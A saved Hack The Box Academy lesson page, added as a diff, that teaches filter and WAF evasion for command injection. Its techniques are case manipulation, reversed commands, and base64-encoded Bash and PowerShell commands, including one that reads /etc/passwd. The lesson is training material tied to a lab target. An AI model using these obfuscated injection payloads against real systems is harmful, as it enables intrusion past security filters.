@@ -1,0 +1,1494 @@
+<!DOCTYPE html>
+<!-- saved from url=(0054)https://academy.hackthebox.com/module/109/section/1039 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>Command Injections</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta content="Premium Multipurpose Admin &amp; Dashboard Template" name="description">
+<meta content="Themesbrand" name="author">
+<link rel="shortcut icon" href="https://academy.hackthebox.com/images/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://academy.hackthebox.com/images/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://academy.hackthebox.com/images/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://academy.hackthebox.com/images/apple-touch-icon.png">
+<link rel="mask-icon" href="https://academy.hackthebox.com/images/safari-pinned-tab.svg">
+<link href="./Command Injections9_files/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Command Injections9_files/icons.css" rel="stylesheet" type="text/css">
+<link href="./Command Injections9_files/app-dark.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Command Injections9_files/prism.css" id="app-style" rel="stylesheet" data-style="dark" type="text/css">
+<link href="./Command Injections9_files/toastr.min.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./Command Injections9_files/ryt3opf.css">
+<script type="text/javascript" async="" src="./Command Injections9_files/awwxrc0h"></script><script type="text/javascript" async="" src="./Command Injections9_files/uwt.js.download"></script><script type="text/javascript" async="" src="./Command Injections9_files/insight.min.js.download"></script><script src="./Command Injections9_files/346791856678772" async=""></script><script type="text/javascript" async="" src="./Command Injections9_files/fbevents.js.download"></script><script type="text/javascript" async="" src="./Command Injections9_files/analytics.js.download"></script><script type="text/javascript" src="./Command Injections9_files/commons.54701049fd6fb8497e9e.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Command Injections9_files/intercom.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Command Injections9_files/twitter-ads.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Command Injections9_files/linkedin-insight-tag.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Command Injections9_files/facebook-pixel.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" src="./Command Injections9_files/google-analytics.dynamic.js.gz" async="" status="loaded"></script><script type="text/javascript" async="" src="./Command Injections9_files/recaptcha__en.js.download" crossorigin="anonymous" integrity="sha384-TE9Ls1LqNaomGaFdDlxBJIkg+bFnKWbASEx9XrnnCV1SiORfW/qiKK2lsAbkVeBa"></script><script type="text/javascript" async="" src="./Command Injections9_files/analytics.min.js.download"></script><script>
+        !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics._writeKey="eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I";analytics.SNIPPET_VERSION="4.13.2";
+                analytics.load("eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I");
+                                                        properties = {"platform":"Academy","platform_version":"V1","module_id":109,"module_name":"Command Injections","module_difficulty":"Medium","section_id":1039,"section_title":"Advanced Command Obfuscation"};
+                                                analytics.page(
+                    "Module",
+                    properties
+                );
+                                            }
+        }();
+    </script>
+<style>
+    .website-screenshot-url {
+        height: 22px;
+        cursor: text;
+        padding-left: 10px;
+    }
+</style>
+<script src="./Command Injections9_files/api.js.download"></script>
+</head>
+<body data-layout="detached" data-topbar="colored">
+<div class="container-fluid">
+<div id="layout-wrapper">
+<header id="page-topbar">
+<div class="navbar-header">
+<div class="container-fluid">
+<div class="float-right">
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<a href="https://academy.hackthebox.com/billing">
+<button type="button" class="btn btn-extra-light">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;Purchase Cubes
+</button>
+</a>
+</div>
+<div class="dropdown d-none d-lg-inline-block ml-1">
+<button type="button" class="btn header-item noti-icon waves-effect" data-toggle="fullscreen">
+<i class="mdi mdi-fullscreen"></i>
+</button>
+</div>
+<div class="dropdown d-inline-block">
+<button type="button" class="btn header-item waves-effect" id="page-header-user-dropdown" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<img class="rounded-circle header-profile-user" src="./Command Injections9_files/1782606024b767354a8c9d75e1a6323a" alt="Header Avatar">
+<span class="d-none d-xl-inline-block ml-1">Tommy034</span>
+<i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
+</button>
+<div class="dropdown-menu dropdown-menu-right">
+<a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 align-middle mr-1"></i> Billing</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 align-middle mr-1"></i> Settings</a>
+<a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 align-middle mr-1"></i> Vpn Settings</a>
+<div class="dropdown-divider"></div>
+<form method="POST" action="https://academy.hackthebox.com/logout"> <input type="hidden" name="_token" value="OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E"> <a onclick="$(this).closest(&#39;form&#39;).submit()" class="dropdown-item text-danger" href="https://academy.hackthebox.com/module/109/section/1039#"><i class="bx bx-power-off font-size-16 align-middle mr-1 text-danger"></i> Logout</a>
+</form>
+</div>
+</div>
+</div>
+<div class="d-flex align-items-center">
+<div class="navbar-brand-box">
+<a href="https://academy.hackthebox.com/dashboard" class="logo">
+<span class="logo-sm">
+<img src="./Command Injections9_files/logo.svg" alt="" height="30">
+</span>
+<span class="logo-lg">
+<img src="./Command Injections9_files/logo.svg" alt="" height="36">
+</span>
+</a>
+</div>
+<button type="button" class="btn btn-sm px-3 font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn">
+<i class="fa fa-fw fa-bars"></i>
+</button>
+<div class="topnav">
+<nav class="navbar navbar-light navbar-expand-lg topnav-menu">
+<div class="collapse navbar-collapse" id="topnav-menu-content">
+<ul class="navbar-nav active">
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
+Modules</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
+</li>
+</ul>
+</div>
+</nav>
+</div>
+</div>
+</div>
+</div>
+</header>
+<div class="main-content">
+<div class="page-content">
+<div class="row">
+<div class="col-12">
+<div class="page-title-box d-flex align-items-center justify-content-between">
+<h4 class="page-title mb-0 font-size-18 letter-spacing-1">Command Injections &nbsp;<i style="cursor:pointer;" data-module-id="109" data-toggle="tooltip" data-title="Toggle To-Do" class="favouriteBtn  fa  fa-heart text-danger" data-original-title="" title=""></i></h4>
+<div class="page-title-right">
+<ol class="breadcrumb m-0">
+<li class="breadcrumb-item"><a href="javascript: void(0);">Page 9</a></li>
+<li class="breadcrumb-item active">Advanced Command Obfuscation</li>
+</ol>
+</div>
+</div>
+</div>
+</div>
+<div class="row justify-content-xl-center">
+<div class="col-md-12 col-xl-9 col-xxl-7">
+<div class="training-module">
+<h1>Advanced Command Obfuscation</h1>
+<hr>
+<p>In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.</p>
+<hr>
+<h2>Case Manipulation</h2>
+<p>One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. <code>WHOAMI</code>) or alternating between cases (e.g. <code>WhOaMi</code>). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.</p>
+<p>If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title"></span>
+                </div>
+            <pre class=" language-powershell-session" style="background: rgb(1, 36, 86); line-height: 0px;"><code class=" language-powershell-session" style="color: white;"><span class="token output">PS C:\htb&gt; WhOaMi
+
+21y4d
+</span></code></pre></div></div>
+<p>However, when it comes to Linux and a bash shell, which are case-sensitive, as mentioned earlier, we have to get a bit creative and find a command that turns the command into an all-lowercase word. One working command we can use is the following:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title"></span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation">21y4d@htb[/htb]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token punctuation">$(</span>tr <span class="token string">"[A-Z]"</span> <span class="token string">"[a-z]"</span></span></span><span class="token output">&lt;&lt;&lt;"WhOaMi")
+
+21y4d
+</span></code></pre></div></div>
+<p>As we can see, the command did work, even though the word we provided was (<code>WhOaMi</code>). This command uses <code>tr</code> to replace all upper-case characters with lower-case characters, which results in an all lower-case character command. However, if we try to use the above command with the <code>Host Checker</code> web application, we will see that it still gets blocked:</p>
+<h4>Burp POST Request</h4>
+<p><img src="./Command Injections9_files/cmdinj_filters_commands_3.jpg" alt="Filter Commands"></p>
+<p><code>Can you guess why?</code> It is because the command above contains spaces, which is a filtered character in our web application, as we have seen before. So, with such techniques, <code>we must always be sure not to use any filtered characters</code>, otherwise our requests will fail, and we may think the techniques failed to work.</p>
+<p>Once we replace the spaces with tabs (<code>%09</code>), we see that the command works perfectly:</p>
+<h4>Burp POST Request</h4>
+<p><img src="./Command Injections9_files/cmdinj_filters_commands_4.jpg" alt="Filter Commands"></p>
+
+<p>There are many other commands we may use for the same purpose, like the following:</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">bash</span></div><pre class=" language-bash"><code class=" language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token string">"WhOaMi"</span><span class="token punctuation">;</span><span class="token builtin class-name">printf</span> %s <span class="token string">"<span class="token variable">${a<span class="token operator">,,</span>}</span>"</span><span class="token variable">)</span></span>
+</code></pre></div></div>
+<div class="card bg-light">
+<div class="card-body">
+<p class="mb-0">Exercise: Can you test the above command to see if it works on your Linux VM, and then try to avoid using filtered characters to get it working on the web application?</p>
+</div>
+</div>
+
+<hr>
+<h2>Reversed Commands</h2>
+<p>Another command obfuscation technique we will discuss is reversing commands and having a command template that switches them back and executes them in real-time. In this case, we will be writing <code>imaohw</code> instead of <code>whoami</code> to avoid triggering the blacklisted command.</p>
+<p>We can get creative with such techniques and create our own Linux/Windows commands that eventually execute the command without ever containing the actual command words. First, we'd have to get the reversed string of our command in our terminal, as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'whoami'</span> <span class="token operator">|</span> <span class="token function">rev</span></span></span>
+<span class="token output">imaohw
+</span></code></pre></div></div>
+<p>Then, we can execute the original command by reversing it back in a sub-shell (<code>$()</code>), as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token info punctuation">21y4d@htb[/htb]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token punctuation">$(</span>rev</span></span><span class="token output">&lt;&lt;&lt;'imaohw')
+
+21y4d
+</span></code></pre></div></div>
+<p>We see that even though the command does not contain the actual <code>whoami</code> word, it does work the same and provides the expected output. We can also test this command with our exercise, and it indeed works:</p>
+<h4>Burp POST Request</h4>
+<p><img src="./Command Injections9_files/cmdinj_filters_commands_5.jpg" alt="Filter Commands"></p>
+<div class="card bg-light">
+<div class="card-body">
+<p class="mb-0">Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.</p>
+</div>
+</div>
+<p>The same can be applied in <code>Windows.</code> We can first reverse a string, as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-powershell-session" style="background: rgb(1, 36, 86); line-height: 0px;"><code class=" language-powershell-session" style="color: white;"><span class="token output">PS C:\htb&gt; "whoami"[-1..-20] -join ''
+
+imaohw
+</span></code></pre></div></div>
+<p>We can now use the below command to execute a reversed string with a PowerShell sub-shell (<code>iex "$()"</code>), as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-powershell-session" style="background: rgb(1, 36, 86); line-height: 0px;"><code class=" language-powershell-session" style="color: white;"><span class="token info punctuation">PS C<span class="token punctuation">:</span><span class="token path">\htb&gt; iex "</span></span><span class="token command">$<span class="token bash language-powershell"><span class="token punctuation">(</span><span class="token string">'imaohw'</span><span class="token punctuation">[</span>-1<span class="token punctuation">..</span>-20<span class="token punctuation">]</span> -join <span class="token string">''</span><span class="token punctuation">)</span></span></span><span class="token output">"
+
+21y4d
+</span></code></pre></div></div>
+<hr>
+<h2>Encoded Commands</h2>
+<p>The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the shell and eventually fails to execute. Instead of copying an existing command online, we will try to create our own unique obfuscation command this time. This way, it is much less likely to be denied by a filter or a WAF. The command we create will be unique to each case, depending on what characters are allowed and the level of security on the server.</p>
+<p>We can utilize various encoding tools, like <code>base64</code> (for b64 encoding) or <code>xxd</code> (for hex encoding). Let's take <code>base64</code> as an example. First, we'll encode the payload we want to execute (which includes filtered characters):</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> -n <span class="token string">'cat /etc/passwd | grep 33'</span> <span class="token operator">|</span> base64</span></span>
+
+<span class="token output">Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+</span></code></pre></div></div>
+<p>Now we can create a command that will decode the encoded string in a sub-shell (<code>$()</code>), and then pass it to <code>bash</code> to be executed (i.e. <code>bash&lt;&lt;&lt;</code>), as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">bash</span></span></span><span class="token output">&lt;&lt;&lt;</span><span class="token command"><span class="token shell-symbol important">$</span><span class="token bash language-bash"><span class="token punctuation">(</span>base64 -d</span></span><span class="token output">&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></code></pre></div></div>
+<p>As we can see, the above command executes the command perfectly. We did not include any filtered characters and avoided encoded characters that may lead the command to fail to execute.</p>
+<div class="card bg-light">
+<div class="card-body">
+<p class="mb-0">Tip: Note that we are using <code>&lt;&lt;&lt;</code> to avoid using a pipe <code>|</code>, which is a filtered character.</p>
+</div>
+</div>
+<p>Now we can use this command (once we replace the spaces) to execute the same command through command injection:</p>
+<h4>Burp POST Request</h4>
+<p><img src="./Command Injections9_files/cmdinj_filters_commands_6.jpg" alt="Filter Commands"></p>
+<p>Even if some commands were filtered, like <code>bash</code> or <code>base64</code>, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like <code>sh</code> for command execution and <code>openssl</code> for b64 decoding, or <code>xxd</code> for hex decoding.</p>
+<p>We use the same technique with Windows as well. First, we need to base64 encode our string, as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-powershell-session" style="background: rgb(1, 36, 86); line-height: 0px;"><code class=" language-powershell-session" style="color: white;"><span class="token output">PS C:\htb&gt; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+dwBoAG8AYQBtAGkA
+</span></code></pre></div></div>
+<p>We may also achieve the same thing on Linux, but we would have to convert the string from <code>utf-8</code> to <code>utf-16</code> before we <code>base64</code> it, as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">Tommy034@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">echo</span> -n <span class="token function">whoami</span> <span class="token operator">|</span> <span class="token function">iconv</span> -f utf-8 -t utf-16le <span class="token operator">|</span> base64</span></span>
+
+<span class="token output">dwBoAG8AYQBtAGkA
+</span></code></pre></div></div>
+<p>Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (<code>ies "$()"</code>), as follows:</p>
+<div class="window_container"><div class="window_content">
+                <div class="window_top">
+                    <span class="window_dot bg-danger"></span>
+                    <span class="window_dot bg-warning"></span>
+                    <span class="window_dot bg-success"></span>
+                    <span class="window_title">Burp POST Request</span>
+                </div>
+            <pre class=" language-powershell-session" style="background: rgb(1, 36, 86); line-height: 0px;"><code class=" language-powershell-session" style="color: white;"><span class="token info punctuation">PS C<span class="token punctuation">:</span><span class="token path">\htb&gt; iex "</span></span><span class="token command">$<span class="token bash language-powershell"><span class="token punctuation">(</span><span class="token punctuation">[</span>System.Text.Encoding<span class="token punctuation">]</span>::Unicode.GetString<span class="token punctuation">(</span><span class="token punctuation">[</span>System.Convert<span class="token punctuation">]</span>::FromBase64String<span class="token punctuation">(</span><span class="token string">'dwBoAG8AYQBtAGkA'</span><span class="token punctuation">))</span><span class="token punctuation">)</span></span></span><span class="token output">"
+
+21y4d
+</span></code></pre></div></div>
+<p>As we can see, we can get creative with <code>Bash</code> or <code>PowerShell</code> and create new bypassing and obfuscation methods that have not been used before, and hence are very likely to bypass filters and WAFs. Several tools can help us automatically obfuscate our commands, which we will discuss in the next section.</p>
+<p>In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. We can find some such techniques on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion" target="_blank" rel="noopener nofollow">PayloadsAllTheThings</a>.</p>
+<div class="card" id="questionsDiv">
+<div class="card-body">
+<div class="row">
+<div class="col-9">
+<h4 class="card-title mt-0 font-size-medium">Questions</h4>
+<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below to complete this Section and earn cubes!</p>
+<p class="card-title-desc font-size-large font-size-15">
+Target: <span class="text-success"><span class="target" style="cursor:pointer;"><span class="spawnTargetBtn">Click here to spawn the target system!</span></span></span>
+<button class="resetTargetBtn btn btn-light btn-sm " data-toggle="tooltip" data-title="Reset Target" style="cursor: pointer; display: none;" data-original-title="" title=""><i class="fad fa-sync text-warning"></i></button>
+<br>
+<span class="targetLifeTimeContainer" style="display: none;">Time Left: <span class="targetLifeTime  font-size-15">0</span> minutes</span>
+</p>
+</div>
+<div class="col-3 text-right float-right">
+<button class="btn btn-light bg-color-blue-nav mt-2" data-toggle="modal" data-target="#cheatSheetModal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
+</div>
+</div>
+<div>
+<div>
+<label class="module-question" for="706"><span class="badge badge-soft-dark font-size-14 mr-2">+ 2 <i class="fad fa-cube text-success"></i></span> Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1</label>
+<div class="row">
+<div class=" col-lg-8  mb-4">
+<input class="form-control bg-color-blue-nav" id="answer706" type="text" color="green" placeholder="Submit your answer here..." maxlength="191">
+</div>
+<div class="col-lg-2 mb-4">
+<button class="btn btn-primary btn-block btnAnswer" id="btnAnswer706" data-question-id="706"><i class="fad fa-flag-checkered mr-2"></i> Submit</button>
+</div>
+<div class="col-lg-2 mb-4">
+<button class="btn btn-outline-warning btn-block" data-toggle="modal" id="hintBtn706" data-target="#hint706"><i class="fad fa-life-ring mr-2"></i> Hint</button>
+</div>
+</div>
+<div class=""></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="card bg-color-blue-nav" style="margin: 30px 0">
+<div class="card-body">
+<a href="https://academy.hackthebox.com/module/109/section/1038" class="btn btn-light module-button py-2" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
+<form action="https://academy.hackthebox.com/module" method="POST" class="form-inline" id="completeForm" style="float: right">
+<input type="hidden" name="module_id" value="109">
+<input type="hidden" name="page_id" value="10">
+<input type="hidden" name="completed" value="1">
+<button id="completeBtn" class="btn btn-outline-success" style="display:none;"><i class="fa fa-check-circle"></i> Mark Complete &amp; Next</button>
+</form>
+<a href="https://academy.hackthebox.com/module/109/section/1040" class="btn btn-light ml-2 module-button py-2" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
+</div>
+</div>
+</div>
+<div class="col-md-12 col-xl-3 col-xxl-3">
+<div id="table-of-contents">
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<button class="btn btn-light btn-block module-button" data-toggle="modal" data-target="#cheatSheetModal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
+<a href="https://academy.hackthebox.com/module/109/section/1039#questionsDiv" class="btn btn-light btn-block module-button"><i class="fad fa-question mr-2"></i> Go to Questions</a>
+</div>
+</div>
+<div class="card" id="TOC">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
+<a href="https://academy.hackthebox.com/module/109/section/1031" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+ <span class="font-size-13">Intro to Command Injections</span>
+</a>
+<h6 class="mt-4 mb-2">Exploitation</h6> <a href="https://academy.hackthebox.com/module/109/section/1032" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Detection</span>
+</a>
+<a href="https://academy.hackthebox.com/module/109/section/1033" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Injecting Commands</span>
+</a>
+<a href="https://academy.hackthebox.com/module/109/section/1034" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Other Injection Operators</span>
+</a>
+<h6 class="mt-4 mb-2">Filter Evasion</h6> <a href="https://academy.hackthebox.com/module/109/section/1035" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Identifying Filters</span>
+</a>
+<a href="https://academy.hackthebox.com/module/109/section/1036" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Bypassing Space Filters</span>
+</a>
+<a href="https://academy.hackthebox.com/module/109/section/1037" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Bypassing Other Blacklisted Characters</span>
+</a>
+<a href="https://academy.hackthebox.com/module/109/section/1038" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Bypassing Blacklisted Commands</span>
+</a>
+ <a href="https://academy.hackthebox.com/module/109/section/1039" class="btn   text-primary  btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Advanced Command Obfuscation</span>
+</a>
+<a href="https://academy.hackthebox.com/module/109/section/1040" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Evasion Tools</span>
+</a>
+<h6 class="mt-4 mb-2">Prevention</h6> <a href="https://academy.hackthebox.com/module/109/section/1041" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<span class="font-size-13">Command Injection Prevention</span>
+</a>
+<h6 class="mt-4 mb-2">Skills Assessment</h6> <a href="https://academy.hackthebox.com/module/109/section/1042" class="btn   btn-sm btn-block mt-1 py-2 text-left btn-lighter">
+<i class="fad fa-cube text-success mt-1 mr-2"></i>&nbsp;
+<span class="font-size-13">Skills Assessment</span>
+</a>
+</div>
+</div>
+<div class="card">
+<div class="card-body bg-color-blue-nav">
+<h5 class="card-title mb-4">My Workstation</h5>
+<div class="row">
+<div class="col-12">
+<div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
+<div class="screenPlaceholder">
+<p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">OFFLINE</p>
+<p class="instanceLoading " style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
+</div>
+</div>
+</div>
+<div class="col-12 mt-2">
+<div class="instanceStart">
+<button class=" startInstanceBtn btn btn-light btn-sm mt-2 btn-block module-button py-2"><i class="fad fa-play-circle text-success"></i> &nbsp;Start Instance</button>
+<p class="text-center mt-2 font-size-13 font-secondary">
+<span class="text-success spawnsLeft">
+<i class="fal fa-infinity"></i>
+</span> / 1 spawns left
+</p>
+</div>
+<button style="display:none;" class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-expand text-success"></i> &nbsp;Interact</button>
+<button style="display:none;" class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-times text-danger"></i> &nbsp;Terminate</button>
+<button style="display:none;" class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2"><i class="fad fa-sync text-warning"></i> &nbsp;Reset</button>
+<div class="btn-group" role="group">
+<button style="display:none; cursor: default;" class=" extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2">Life Left: <span class="lifeLeft"></span>m</button>
+<button style="display:none;" data-toggle="tooltip" data-title="Extend Life" class=" extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2" data-original-title="" title=""><i class="fa fa-plus text-success"></i></button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="hint706" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="hint706" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center">
+<h5><i class="fad fa-life-ring text-success"></i>&nbsp; Hint</h5>
+<br>
+<h6>Don't forget to bypass any filtered characters</h6>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="cheatSheetModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="unlockModuleModal" aria-hidden="true">
+<div class="modal-dialog modal-lg">
+<div class="modal-content">
+<div class="modal-body">
+<div class="text-center text-break">
